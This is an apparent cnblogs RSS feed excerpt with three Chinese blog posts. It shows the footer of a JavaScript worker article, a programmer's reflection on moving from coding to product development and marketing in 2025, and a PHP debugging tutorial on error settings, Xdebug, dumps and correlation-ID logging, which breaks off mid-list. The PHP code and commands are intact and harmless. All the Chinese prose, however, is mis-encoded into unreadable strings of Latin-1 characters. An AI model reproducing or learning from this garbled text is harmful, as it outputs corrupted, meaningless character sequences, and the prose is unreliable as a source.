		        åºå¤ï¼<a href="https://www.cnblogs.com/IwishIcould/">https://www.cnblogs.com/IwishIcould/</a> <br>
                        <p> æ³é®é®é¢ï¼æèµäºåå¾®çåä¸»ï¼æ±æ±ä½ å¤æ³¨ä¸ä¸çæ£æ£æèå¾®ä¿¡ï¼è¿æ ·æå¥½èç³»ä½ ï¼(ã£â¢ÌÏâ¢Ì)ã£ââ¾â¾ï¼</p>
		        <p>å¦æè§å¾è¿ç¯æç« å¯¹ä½ æå°å°çå¸®å©çè¯ï¼è®°å¾å¨å³ä¸è§ç¹ä¸ªâæ¨èâå¦ï¼æèå³æ³¨åä¸»ï¼å¨æ­¤æè°¢ï¼</p>
		        <p> ä¸æ°´åå±±æ»æ¯æï¼æèµ5æ¯ä¹°è¾£æ¡è¡ä¸è¡ï¼æä»¥å¦æä½ å¿æè¿æ¯è¾é«å´ï¼ä¹æ¯å¯ä»¥æ«ç æèµåä¸»(ã£â¢ÌÏâ¢Ì)ã£ââ¾â¾ï¼</p>
                        <p> æ³é®é®é¢ï¼æèµäºåå¾®çåä¸»ï¼æ±æ±ä½ å¤æ³¨ä¸ä¸çæ£æ£æèå¾®ä¿¡ï¼è¿æ ·æå¥½èç³»ä½ ï¼(ã£â¢ÌÏâ¢Ì)ã£ââ¾â¾ï¼</p>
				<div style="display: flex;">
					<div style="margin-right: 100px;text-align: center;">
						<img src="//images.cnblogs.com/cnblogs_com/IwishIcould/1900124/t_201214043958æ¯ä»å®æ¶æ¬¾ç .jpg?a=1607924145179">
						<div>
							æ¯ä»å®
						</div>
					</div>
					<div style="text-align: center;">
						<img src="//images.cnblogs.com/cnblogs_com/IwishIcould/1900124/t_20121604194271E6E296CCB71A007F4E22073D5EB64A.jpg">
						<div>å¾®ä¿¡</div>
					</div>
				</div>
		        æ¬æçæå½ä½èææï¼æ¬¢è¿è½¬è½½ï¼æªç»ä½èåæé¡»ä¿çæ­¤æ®µå£°æï¼å¨æç« é¡µé¢ææ¾ä½ç½®ç»åºåæè¿æ¥ <br>
		        å¦ææä¸­æä»ä¹éè¯¯ï¼æ¬¢è¿æåºãä»¥åæ´å¤çäººè¢«è¯¯å¯¼ã <br>
               
		    </div>
           
            
		</div>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-04 09:04">2026-01-04 09:03</span>&nbsp;
<a href="https://www.cnblogs.com/IwishIcould">åé£ææ¥æç¸è¯</a>&nbsp;
éè¯»(<span id="post_view_count">73</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19377799);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19377799', targetLink: 'https://www.cnblogs.com/IwishIcould/p/19377799', title: 'jsä¸­workerçè¯¦ç»è®²è§£' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ãä¸ä¸ªç¨åºç¿ççå½å¨æã-ãåå±ç¯ã- 49.ä»åä»£ç ãå°å¼åè½¯ä»¶äº§åãåå°å¼æåç«¯å¸åºï¼2025å¹´æ¯è½¬åå³é®çä¸å¹´ ]]></title>
    <link>https://www.cnblogs.com/blog470130547/p/19435739</link>
    <guid>92ec5c05eb67d4fcdb0bc02516b4e10a</guid>
    <description>
    <![CDATA[ 
		<h1 class="postTitle">
			<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/blog470130547/p/19435739" title="åå¸äº 2026-01-04 08:49">
    <span role="heading" aria-level="2">ãä¸ä¸ªç¨åºç¿ççå½å¨æã-ãåå±ç¯ã- 49.ä»åä»£ç ãå°å¼åè½¯ä»¶äº§åãåå°å¼æåç«¯å¸åºï¼2025å¹´æ¯è½¬åå³é®çä¸å¹´</span>
    

</a>

		</h1>
		<div class="clear"></div>
		<div class="postBody">
			    <div id="cnblogs_post_description" style="display: none">
        
        ç»è¿å¤å¹´æç»´è½¬åãè§è²è½¬æ¢ãå·¥ä½ç§¯ç´¯ï¼2025å¹´æ¯è½¬åçå³é®ä¸å¹´ï¼åºæ¬å½¢æ4å¤§é¡¹ç®åä½æ¸ éï¼1ä¸ªé¢åå»ºæè¡ä¸é¢åæ¸ éã1ä¸ªé¢åç¿å±±è¡ä¸é¢åæ¸ éã1ä¸ªé¢ååèåºåè·¨è¡ä¸æ¸ éã1ä¸ªé¢åæ°è½æºè¡ä¸æ¸ éï¼æä»¥ç°å¨æ¯äº§åäºèç½éå®åæå±è¡ä¸é¡¹ç®çåè½¨å¹¶è¡çå±é¢ï¼äº§åæç»­å®åï¼éç¹æ¾å¨æå±è¡ä¸é¡¹ç®æ¸ éã
    </div>
<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><span style="font-size: 16px">&nbsp; &nbsp; &nbsp; &nbsp;å·²ç¶å·¥ä½äº19ä¸ªå¹´å¤´ï¼ä»2006å¹´æ¯ä¸ï¼å¹²äº1å¹´è®¾å¤å®è£åç»´æ¤çå·¥ä½ï¼2006å¹´~2007å¹´ï¼ï¼å°½ç®¡å½æ¶å¾è¾è¦ï¼ä½æ¯å¥ å®äºç°å¨åäºçåæ ¼ä¸é§æ§ï¼å¹²äº18å¹´ï¼2007å¹´~2025å¹´ï¼çè½¯ä»¶å¼åãé¡¹ç®å®æ½åç®¡çå¢éç¸å³å·¥ä½ï¼æé´åºçè¿ä¸ä¸ä¹¦ç±ï¼ä»äºè¿ä¸ªè¡ä¸çº¯æ¯å´è¶£ç±å¥½ä½¿ç¶ï¼å°½ç®¡ç°å¨åä»£ç çæ¶é´è¶æ¥è¶å°äºï¼ä½æ¯ä¾ç¶å¨å®åä»£ç ç»´æ¤èªå·±çè½¯ä»¶äº§åï¼å¹²äº7å¹´çå¼åè½¯ä»¶äº§åçå·¥ä½ï¼2018å¹´~2025å¹´ï¼ï¼æ»æè§ä»äºè½¯ä»¶è¡ä¸æ¯æç¹ææ¯å«éçï¼å¦ææ²¡æèªå·±çè½¯ä»¶äº§åä»£è¡¨ä½åï¼å°±è¿æ ·ç»èèå»ï¼é£ä¹æ»è§å¾æç¹éæ¾ï¼å½ç¶å¼åè½¯ä»¶äº§åä¹æ¯ä¸ºäºæ´å¥½çåå±ï¼å¹²äº3å¹´ï¼2023å¹´~2025å¹´ï¼çå¼æåç«¯å¸åºçå·¥ä½ï¼åªæ¯è¿3å¹´æ´ä¸æ³¨äºå¼æå¸åºï¼å¾æ©ä¹åä¹åäºå¤§éçéºå«å·¥ä½ï¼ä¾å¦ä¹ååçæç« æãäºååèåºçå¸åºéå®ãããåæ¬¡è¿ååèå¸åºãç­ç­ã</span></p>
<p><span style="font-size: 16px"><img alt="210609153103996" width="617" height="289" loading="lazy" style="display: block; margin-left: auto; margin-right: auto" data-src="https://img2024.cnblogs.com/blog/691334/202601/691334-20260104084803353-602689524.jpg" class="lazyload"></span></p>
<div><span style="font-size: 16px">&nbsp; &nbsp; &nbsp; 19å¹´çè¿å¾å¤§è´åä¸º3ä¸ªé¶æ®µï¼åä»£ç ã<a href="http://www.ineuos.net" target="_blank" rel="noopener nofollow">å¼åäº§å</a>ãå¼æå¸åºãè¿ä¸ªè¿ç¨æ¶åå°ä¸ä¸ªæ ¸å¿é®é¢ï¼ä¸ºä»ä¹è¦å¯»æ±çªç ´ï¼æä¸¤ä¸ªåå ï¼ï¼1ï¼<strong>è½åè¾¹çåé</strong>ï¼å¤§é¨åå·¥ä½å¹²çç»äºä¹åé½ä¼è¿å¥éå¤é¶æ®µï¼å³å¤±å»äºæ°é²æãåå¤±å»äºåé åï¼è¿æ¯å¯¹æ¶é´åçå½çäºµæ¸ï¼ï¼2ï¼<strong>çäºç­å¤ãæ­»äºé¿å¤</strong>ï¼è¿æ¯è¾©è¯çæç»´æ¨¡å¼ï¼è¦æ³å¨é¢åå±ï¼è¦å¼¥è¡¥èªå·±çç­æ¿ï¼å ä¸ºèªå·±çé¿å¤åæ¥çæè´çæ¶åä¼åå°äºè¿ç§å¢å°ï¼å¾å¾è·³åºè¿ç§å¢å°æè½æèµèªå·±ï¼è¿ä¹æ¯ææ»¡åäºãæ°´æ»¡åæº¢çéçãä¾å¦ç®¡çè¿å°30äººçææ¯å¢éï¼æå¸¸çæ¥è®²åºè¯¥å°½åä¿ä½è¿ä¸ªè§è²ï¼ä½æ¯å¨2022å¹´ç«å³å³å®ä¸ç®¡çå¢éäºï¼åæä¸ä¸ªåæå¸ä»¤ï¼æ´ä¸æ³¨äºå¼æå¸åºã</span></div>
<div><span style="font-size: 16px">&nbsp; &nbsp; &nbsp; &nbsp;åä»£ç çæ¶åï¼æè§ä¸è¿ç¾ãä¸çå¿ï¼äºæ¯å¼å§æ¾äººãç»å¢éï¼å¼åäº§åï¼æäºäº§åä¹åï¼åé¢ä¸´éå®é®é¢ï¼äºæ¯ææ´å¤çæ¶é´ä¸æ³¨äºäºèç½è¥é+å¼æåç«¯å¸åºï¼æ¾å®¢æ·ãæ¾é¡¹ç®ï¼è¿ä¸ªé¶æ®µè¦ç»åæ´é¿çæ¶é´ãç°å¨çç²¾ååéæ¯10%åä»£ç ææ´å°ã30%éæ±æ´çåäº§åè®¾è®¡ã60%ä¸æ³¨äºå¼æå¸åºç©ºé´ã</span></div>
<div><span style="font-size: 16px">&nbsp; &nbsp; &nbsp; ç»è¿å¤å¹´æç»´è½¬åãè§è²è½¬æ¢ãå·¥ä½ç§¯ç´¯ï¼2025å¹´æ¯è½¬åçå³é®ä¸å¹´ï¼åºæ¬å½¢æ4å¤§é¡¹ç®åä½æ¸ éï¼<strong>1ä¸ªé¢åå»ºæè¡ä¸é¢åæ¸ éã1ä¸ªé¢åç¿å±±è¡ä¸é¢åæ¸ éã1ä¸ªé¢ååèåºåè·¨è¡ä¸æ¸ éã1ä¸ªé¢åæ°è½æºè¡ä¸</strong><strong>æ¸ é</strong>ï¼æä»¥ç°å¨æ¯äº§åäºèç½éå®åæå±è¡ä¸é¡¹ç®çåè½¨å¹¶è¡çå±é¢ï¼äº§åæç»­å®åï¼éç¹æ¾å¨æå±è¡ä¸é¡¹ç®æ¸ éã</span></div>
<div><span style="font-size: 16px">&nbsp; &nbsp; &nbsp; &nbsp;å°½ç®¡çå¥½å½¢å¿çåå±ï¼ä½æ¯ä»ç¶é¢ä¸´å°é¾åææï¼é¦åå¨<strong>æ²¡æå½¢æè§æ¨¡åå¢éä½æ</strong>çæåµä¸ï¼ä¸ªäººè¦æå¥å¤§éçæ¶é´åç²¾åï¼é¢ç¹çåºå·®ãæ²éãææ¯äº¤æµãè°ç ç­ï¼å¶æ¬¡<strong>åä½æ¹äººåç»¼åç´ è´¨çä¸ç¡®å®æ§</strong>ï¼å¤§å®¶åªåçæ¹åæ¯ä¿æé¡¹ç®åä½ï¼ä½æ¯ç±äºäººåçæç»´æ¹å¼åç»¼åç´ è´¨çé®é¢ï¼çä¼¼è½æåçé¡¹ç®å¾å¾ä»¥å¤±è´¥èç»æï¼æå<strong>é¡¹ç®æ¶åå°å¤æ¹çåè°å·¥ä½</strong>ï¼å¤æ¹åè°å·¥ä½å¾éè¦çä¸ä¸ªé®é¢å°±æ¯ä¿¡æ¯ä¸å¯¹ç§°ï¼å¤§å®¶åèªé½âä»¥ä¸ºâæä¹çï¼ä½æ¯å¾å¾å¤§å®¶é½äºç¸ä¸ç¥æï¼æä»¥å¯¹äºåè°è½åãæ¨è¿çå³é®èç¹ãä¿¡æ¯ä¸è´æ§è¦æ±éå¸¸é«ã</span></div>
<div><span style="font-size: 16px">&nbsp; &nbsp; &nbsp; ååæ¥å¢éçä¸ä½å¼åäººåäº¤æµæ¯å¦è¦å¹²å®åè§£å³æ¹æ¡ï¼è½å¤æè§å°ä»æ¯è¾ç¹è±«ãå¤§é¨åäººçæç»´æ¨¡å¼æ¯<strong>å¾ä¹æå¹²ç¡®å®çäºï¼ä¸æ¿æå¹²ä¸ç¡®å®çãæé£é©çäº</strong>ãå¦ææä¸ä¸ªé¡¹ç®è¦æ¾å®æ½æ¹ï¼é£ä¹ä½ æä¹è½å¤ä¿è¯è½å¤æ¾å°ä½ ï¼å¨è¿ä¸ªè¿ç¨ä¸­è¦åå¾å¤å·¥ä½ï¼ä½æ¯æç»çç®æ æ¯è®©<strong>ç¸å³æ¹ååç¸ä¿¡ä½ </strong>ã</span></div>
<div><span style="font-size: 16px"><span style="font-size: 16px">&nbsp; &nbsp; &nbsp; åä»£ç ãå¼åäº§åãæå±å¸åºæ»ä¹åå½å°ä¸ä¸ªèçå¸¸è°çè¯é¢ï¼<strong>çå­çéæ©æ</strong>ãæä»¥è¦ä¸æ¬¡æ¬¡çªç ´åæçè½åè¾¹çï¼ä¹å°±æ¯éæ©æçåç»´çè¿ç¨ã<strong>ä¸è½å¤ä¿è¯ä¸å®è½æåï¼ä½æ¯ä¸çªç ´ä¸å®ä¼è¢«æ·æ±°</strong>ã</span></span><hr>
<p><strong>ä¸ä¸ªç¨åºç¿ççå½å¨æ å¾®ä¿¡å¹³å°</strong></p>
<p>&nbsp;<strong>å£&nbsp;&nbsp; å·ï¼èä¸äº¤æµï¼èä¸è§åï¼é¢å¯¹ç°å®ï¼ç¨å¿å»äº¤æµãææã</strong></p>
<p>&nbsp;<strong>å¬ä¼å·ï¼iterlifetime</strong></p>
<p><strong><strong>ITerèä¸äº¤æµå¥æ ç¾¤ï¼141588103&nbsp;</strong>&nbsp;&nbsp;<br></strong></p>
<p><strong>å¬ä¼å·</strong><strong>äºç»´ç ï¼</strong></p>
<p><img width="100" class="lazyloaded lazyload" data-src="https://img2020.cnblogs.com/blog/691334/202105/691334-20210510223435712-1931494075.jpg"></p>
</div>
</div>
<div class="clear"></div>

		</div>
		<div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-04 08:49">2026-01-04 08:49</span>&nbsp;
<a href="https://www.cnblogs.com/blog470130547">ä¸ä¸ªç¨åºç¿ççå½å¨æ</a>&nbsp;
éè¯»(<span id="post_view_count">9</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19435739);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19435739', targetLink: 'https://www.cnblogs.com/blog470130547/p/19435739', title: 'ãä¸ä¸ªç¨åºç¿ççå½å¨æã-ãåå±ç¯ã- 49.ä»åä»£ç ãå°å¼åè½¯ä»¶äº§åãåå°å¼æåç«¯å¸åºï¼2025å¹´æ¯è½¬åå³é®çä¸å¹´' })">ä¸¾æ¥</a>
</div>
	 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ 7 ä¸ªä»å¥é¨å°èµæ·± PHP å¼åèé½å¨ç¨çæ ¸å¿è°è¯æè½ ]]></title>
    <link>https://www.cnblogs.com/catchadmin/p/19435596</link>
    <guid>61b8bf924d4c81149650c46e9b4f0122</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/catchadmin/p/19435596" title="åå¸äº 2026-01-04 08:01">
    <span role="heading" aria-level="2">7 ä¸ªä»å¥é¨å°èµæ·± PHP å¼åèé½å¨ç¨çæ ¸å¿è°è¯æè½</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="7-ä¸ªä»å¥é¨å°èµæ·±-php-å¼åèé½å¨ç¨çæ ¸å¿è°è¯æè½">7 ä¸ªä»å¥é¨å°èµæ·± PHP å¼åèé½å¨ç¨çæ ¸å¿è°è¯æè½</h1>
<h2 id="è°è¯çæ®é·çç¸">è°è¯çæ®é·çç¸</h2>
<p>å¤§å¤æ° PHP bug é¾æï¼ä¸æ¯å ä¸ºå®ä»¬"å¤æ"ï¼èæ¯å ä¸ºå®ä»¬<strong>çä¸è§</strong>ã</p>
<p>åéå¨æ¯ä½ é¢ææ©ä¸¤å±çå°æ¹å°±åæäº nullãä¸ä¸ª"ä¸å¯è½åç"çæ¡ä»¶åååªå¨çäº§ç¯å¢åçãè¯·æ±å¨æ¬å°æ­£å¸¸ï¼æ¾å°ä»£çåé¢å°±æäºãéå worker çè¡ä¸ºå HTTP è¿è¡æ¶ä¸ä¸æ ·ãè¿æç»å¸åºæ¯ï¼ä½ ä¿®å¥½äºâ¦â¦ä¸å¨å®ååæ¥äºã</p>
<p>æ³å¿«éæé¿ä¸º PHP å¼åèï¼å«æ¥çå­¦æ´å¤æ¡æ¶ç¹æ§ãåå­¦ä¼<strong>è§å¯ç³»ç»å®éå¨åä»ä¹</strong>ã</p>
<p>ä¸é¢æ¯æè®¤ä¸ºæ¯ä¸ª PHP å¼åèä»ç¬¬ä¸å¤©å°±è¯¥ææ¡ç 7 ä¸ªè°è¯æè½ãå®ä»¬ä¸æ¯è±æï¼èæ¯ä¼æç»­äº§çå¤å©çä¹ æ¯ã</p>
<p><a href="https://catchadmin.com/post/2026-01/debugging-php-like-a-pro" target="_blank" rel="noopener nofollow">åæ 7 ä¸ªä»å¥é¨å°èµæ·± PHP å¼åèé½å¨ç¨çæ ¸å¿è°è¯æè½</a></p>
<h2 id="éè¯¯è¦çå¾è§ä½å«æ´é²ç»ç¨æ·">éè¯¯è¦çå¾è§ï¼ä½å«æ´é²ç»ç¨æ·</h2>
<p>çä¸å°éè¯¯ï¼ä½ å°±ä¸æ¯å¨è°è¯ââä½ æ¯å¨çã</p>
<p>PHP æä¾äºå¯é çéè¯¯å¯è§æ§åè¯­ï¼<code>error_reporting</code>ã<code>display_errors</code> åæ¥å¿è®¾ç½®ãå³é®æ¯æå¼åç¯å¢åçäº§ç¯å¢å½ä½ä¸åçå¯è§æµæ¨¡å¼æ¥å¯¹å¾ã</p>
<p>PHP å®æ¹æåå¼ºçå»ºè®®å¨çäº§ç½ç«ä¸è®°å½éè¯¯èéæ¾ç¤ºéè¯¯ã</p>
<h3 id="å¼åç¯å¢å¨å¼">å¼åç¯å¢ï¼å¨å¼</h3>
<p>å¨å¼åç¯å¢ï¼ä½ éè¦æå¤§åçä¿¡å·ï¼</p>
<pre><code class="language-ini">; php.ini (development)
error_reporting = -1
display_errors = On
display_startup_errors = On
log_errors = On
</code></pre>
<p>å¦æä½ ç¨ Docker æå¼åå®¹å¨ï¼ç¡®è®¤å®¹å¨åé¨çè®¾ç½®ï¼</p>
<pre><code class="language-bash">php -i | grep -E "error_reporting|display_errors|log_errors"
</code></pre>
<h3 id="çäº§ç¯å¢åªè®°å½ä¸æ¾ç¤º">çäº§ç¯å¢ï¼åªè®°å½ï¼ä¸æ¾ç¤º</h3>
<p>å¨çäº§ç¯å¢ï¼<code>display_errors=On</code> ä¸æ¯"æå¸®å©"ï¼èæ¯æ¼æ´ãä½ è¦çæ¯æ¥å¿ï¼ä¸æ¯æ³é²çå æ è·è¸ªã</p>
<pre><code class="language-ini">; php.ini (production)
error_reporting = -1
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php/app-error.log
</code></pre>
<p>ç¶åå¨æéæé´ tail æ¥å¿ï¼</p>
<pre><code class="language-bash">tail -f /var/log/php/app-error.log
</code></pre>
<h3 id="å¼å¸¸æ¥å¿è¦å¸¦ä¸ä¸æ">å¼å¸¸æ¥å¿è¦å¸¦ä¸ä¸æ</h3>
<p>å«å®å¨ä¾èµ PHP é»è®¤çéè¯¯æ¥å¿æ ¼å¼ãå¨åºç¨å¯å¨æ¶æ·»å ä¸ä¸ªé¡¶å±å¼å¸¸å¤çå¨ï¼æ¡æ¶æ å³ï¼ï¼</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

set_exception_handler(function (Throwable $e) {
    error_log(json_encode([
        'level' =&gt; 'error',
        'event' =&gt; 'uncaught_exception',
        'message' =&gt; $e-&gt;getMessage(),
        'type' =&gt; $e::class,
        'file' =&gt; $e-&gt;getFile(),
        'line' =&gt; $e-&gt;getLine(),
        'trace' =&gt; explode("\n", $e-&gt;getTraceAsString()),
    ], JSON_UNESCAPED_SLASHES));
});
</code></pre>
<p>è¿æ¯"ç©·äººçç»æåæ¥å¿"ï¼ä½å·²ç»æ¯ç»å¸ç"å´©äºï¼ä¸ç¥éä¸ºå¥"å¼ºå¤äºã</p>
<p><strong>æè½æ£éª</strong>ï¼å¦ææäººç»ä½ ä¸å¼ çäº§ç¯å¢çéè¯¯æªå¾ï¼ä½ åºè¯¥è½è¯´ï¼"å³æé£ä¸ªãæ¾å°æ¥å¿éãå ä¸å³è IDãç¶åå¤ç°ã"</p>
<h2 id="xdebug-æ­¥è¿è°è¯å«åççäº">Xdebug æ­¥è¿è°è¯ï¼å«åççäº</h2>
<p><code>var_dump()</code> å¨æ¢ç´¢æ¶è¿è¡ãæ­¥è¿è°è¯ææ¯ä½ è®¤çææ¥æ¶ç¨çå·¥å·ã</p>
<p>Xdebug çæ­¥è¿è°è¯å¨è®©ä½ å¯ä»¥éæ­¥æ§è¡ä»£ç å¹¶äº¤äºå¼å°æ£æ¥ç¶æã</p>
<h3 id="çè§£å®è½å¹²ä»ä¹">çè§£å®è½å¹²ä»ä¹</h3>
<p>æ­¥è¿è°è¯åç­çé®é¢ï¼</p>
<ul>
<li>ä»£ç å®éèµ°äºåªæ¡è·¯å¾ï¼</li>
<li>è¿éçå¼æ¯ä»ä¹ï¼ä¸æ¯ä½ èå­éæ³çé£ä¸ªï¼</li>
<li>ä¸ºä»ä¹è¿ä¸ªåæ¯è¢«æ§è¡äºï¼</li>
<li>æ¯ä»ä¹ä¿®æ¹äºè¿ä¸ªåéï¼</li>
</ul>
<h3 id="xdebug-3-æå°éç½®">Xdebug 3 æå°éç½®</h3>
<p>Xdebug æå¤ç§æ¨¡å¼åç°ä»£åçéç½®æ¹å¼ãå®æ¹ææ¡£è¦çäºæ­¥è¿è°è¯åææè®¾ç½®ã</p>
<p>å¨å¤§å¤æ°ç¯å¢ä¸­ï¼å¯ä»¥è¿æ ·éç½®ï¼</p>
<pre><code class="language-ini">; xdebug.ini
xdebug.mode = debug
xdebug.start_with_request = yes
xdebug.client_port = 9003
</code></pre>
<p>ä¸ºä»ä¹æ¯ 9003ï¼Xdebug 3 æ¹äºé»è®¤ç«¯å£ï¼è¿æ¯"è¿ä¸ä¸"é®é¢çå¸¸è§åå ï¼ãIDE ææ¡£åç¤¾åºç­æ¡éå¸¸æ 9003 ä½ä¸º Xdebug 3 çé»è®¤ç«¯å£ã</p>
<h3 id="å±äº«ç¯å¢å«å¸¸å¼è°è¯">å±äº«ç¯å¢å«å¸¸å¼è°è¯</h3>
<p>æ´å¥½çä¹ æ¯æ¯"éè¦æ¶æè°è¯"ãè¿æ ·è½ä¿ææ§è½ç¨³å®ï¼é¿åæå¤æ´é²è°è¯è¡ä¸ºã</p>
<p>å°½éç¨ç¯å¢åéï¼</p>
<pre><code class="language-bash">XDEBUG_MODE=debug php -S localhost:8000 -t public
</code></pre>
<p>æèå¯¹äº PHP-FPM/å®¹å¨ï¼åªå¨å¼åç¯å¢è®¾ç½® <code>XDEBUG_MODE=debug</code>ã</p>
<h3 id="é«æçè°è¯æµç¨">é«æçè°è¯æµç¨</h3>
<ol>
<li>å¨å¯çå½æ°çç¬¬ä¸è¡ææ­ç¹</li>
<li>è§¦åè¯·æ±</li>
<li>æ­¥è¿è¿å¥å½æ°</li>
<li>è§å¯ï¼
<ul>
<li>è¾å¥åæ°</li>
<li>åæ¯æ¡ä»¶</li>
<li>æå¤ç null / ç©ºå­ç¬¦ä¸²</li>
<li>"ç¥ç§"ååçå¼</li>
</ul>
</li>
<li>æ¾å°éè¯¯åè®¾åï¼åä¸æ¥ãç¨ä¸å¥è¯åä¸æ¥ã</li>
</ol>
<p>æåä¸æ­¥å¾éè¦ï¼ç®æ ä¸æ¯"æ éæ¢ç´¢"ï¼èæ¯å¿«éæ¾å°éè¯¯çåè®¾ã</p>
<h2 id="åå«-var_dumpç¨æ´å¥½çæ¹å¼-dump">åå« var_dump()ï¼ç¨æ´å¥½çæ¹å¼ dump</h2>
<p>dump ä»ç¶æç¨ãéè¯¯å¨äºç²ç® dumpã</p>
<p>Symfony ç VarDumper ç»ä»¶æä¾äºæ¯ <code>var_dump()</code> æ´æè¯»ç <code>dump()</code> å½æ°ãå¾å¤æµè¡çæï¼åæ¬ Laravelï¼ç <code>dd()</code> ä¾¿æ·å½æ°é½åºäº VarDumper é£æ ¼ç dump æå»ºã</p>
<h3 id="dump-å³é®å­æ®µå«-dump-æ´ä¸ªå¯¹è±¡">dump å³é®å­æ®µï¼å« dump æ´ä¸ªå¯¹è±¡</h3>
<p>ä¸å¶ dump æ´ä¸ªå¯¹è±¡å¾ç¶åæ»å¨ 5 åéï¼ä¸å¦ dump ä½ å³å¿çå½¢ç¶ã</p>
<p><strong>å·®</strong>ï¼</p>
<pre><code class="language-php">dump($request);
</code></pre>
<p><strong>å¥½</strong>ï¼</p>
<pre><code class="language-php">dump([
  'method' =&gt; $request-&gt;getMethod(),
  'path'   =&gt; $request-&gt;getPathInfo(),
  'userId' =&gt; $user?-&gt;id,
]);
</code></pre>
<h3 id="åä¸ªä¸´æ¶çè°è¯è¾å©å½æ°">åä¸ªä¸´æ¶çè°è¯è¾å©å½æ°</h3>
<p>å¨çº¯ PHP åºç¨ä¸­ï¼å®ä¹ä¸ä¸ªå°è¾å©å½æ°ï¼</p>
<pre><code class="language-php">&lt;?php
function dd(mixed $value): never {
    header('Content-Type: text/plain; charset=utf-8');
    var_dump($value);
    exit(1);
}
</code></pre>
<p>ç¶åè°¨æä½¿ç¨ãéç¹æ¯éåº¦ã</p>
<p><strong>è§å</strong>ï¼å¦æä¸ä¸ªæµç¨éæè¶è¿ 3 ä¸ª dumpï¼ä½ å¯è½éè¦æ­¥è¿è°è¯æå¸¦å³è ID çæ¥å¿ã</p>
<h2 id="æ¥å¿è¦åè¯æ®ä¸æ¯æµæ°´è´¦">æ¥å¿è¦åè¯æ®ï¼ä¸æ¯æµæ°´è´¦</h2>
<p>æ¥å¿ä¸åºè¯¥æ¯æ£è½å¨ä»£ç éçéæºå¥å­ãæ¥å¿åºè¯¥æ¯<strong>è¯æ®</strong>ã</p>
<p>å¦æä½ ç¨ Laravelï¼å®çæ¥å¿ç³»ç»æ¯åºäº channel çï¼é»è®¤ä½¿ç¨"stack" channelãLaravel è¿æ"context"è½åï¼å¯ä»¥å¨è¯·æ±/ä»»å¡/å½ä»¤ä¸­æè·å±äº«åæ°æ®å¹¶åå«å¨æ¥å¿éã</p>
<p>å³ä½¿ä½ ä¸ç¨ Laravelï¼è¿ä¸ªæ¨¡å¼å°å¤éç¨ï¼ä¸æ¬¡æ§éå ä¸ä¸æï¼æ¯è¡æ¥å¿é½åå¾æ´æç¨ã</p>
<h3 id="ç»æ¯ä¸ªè¯·æ±å å³è-id">ç»æ¯ä¸ªè¯·æ±å å³è ID</h3>
<p>è¿æ¯æå¥äº§åºæ¯æé«çè°è¯ææ®µä¹ä¸ã</p>
<p>æ¡æ¶æ å³çç¤ºä¾ï¼</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

function getCorrelationId(): string {
    $hdr = $_SERVER['HTTP_X_REQUEST_ID'] ?? '';
    if (is_string($hdr) &amp;&amp; $hdr !== '') return $hdr;
    // å¦ææ²¡æå°±çæä¸ä¸ª
    return bin2hex(random_bytes(16));
}
$reqId = getCorrelationId();
header('X-Request-Id: ' . $reqId);
</code></pre>
<p>ç¶åå å°æ¥å¿éï¼</p>
<pre><code class="language-php">error_log(json_encode([
  'level' =&gt; 'info',
  'event' =&gt; 'checkout.start',
  'request_id' =&gt; $reqId,
  'user_id' =&gt; $userId ?? null,
  'cart_items' =&gt; count($items),
]));
</code></pre>
<h3 id="è®°å½åæ¯å³ç­èéæµæ°´äºä»¶">è®°å½åæ¯å³ç­ï¼èéæµæ°´äºä»¶</h3>
<p>å³ç­ç¹æ¯è¡ä¸ºååçå°æ¹ï¼</p>
<ul>
<li>æææ£æ¥</li>
<li>éæ©æ¯ä»æä¾å</li>
<li>åéé»è¾</li>
<li>éè¯</li>
<li>åè½å¼å³</li>
</ul>
<p>ç¤ºä¾ï¼</p>
<pre><code class="language-php">&lt;?php
$logger-&gt;info('payment.route', [
  'request_id' =&gt; $reqId,
  'order_id' =&gt; $orderId,
  'provider' =&gt; $providerName,
  'reason' =&gt; 'currency_supported',
]);
</code></pre>
<h3 id="ææä¿¡æ¯ç»å¯¹ä¸è½è¿æ¥å¿">ææä¿¡æ¯ç»å¯¹ä¸è½è¿æ¥å¿</h3>
<p>è±æ tokenãå¯ç ãAuthorization headerãsession IDãè°è¯ä¸å¼å¾è®©å­è¯æ°¸è¿æ³é²å¨æ¥å¿éã</p>
<h2 id="ä¸è½å¤ç°ç-bug-ç­äºæ²¡ä¿®">ä¸è½å¤ç°ç bug ç­äºæ²¡ä¿®</h2>
<p>ä¸è½å¤ç°ç bug æ²¡æè¢«ä¿®å¤ï¼å®åªæ¯å¨ç¡è§ã</p>
<p>æä¸º"è°è¯é«æ"æå¿«çæ¹æ³æ¯å­¦ä¼åå»ºæå°å¤ç°ã</p>
<h3 id="æå°å¤ç°æ¸å">æå°å¤ç°æ¸å</h3>
<p>bug æ¥åæ¥äºï¼ç«å»æè·è¿äºï¼</p>
<ul>
<li>ç²¾ç¡®çè¾å¥ payloadï¼æè±æçæ¬ï¼</li>
<li>ç¯å¢å·®å¼ï¼PHP çæ¬ãæ©å±ãéç½®ï¼</li>
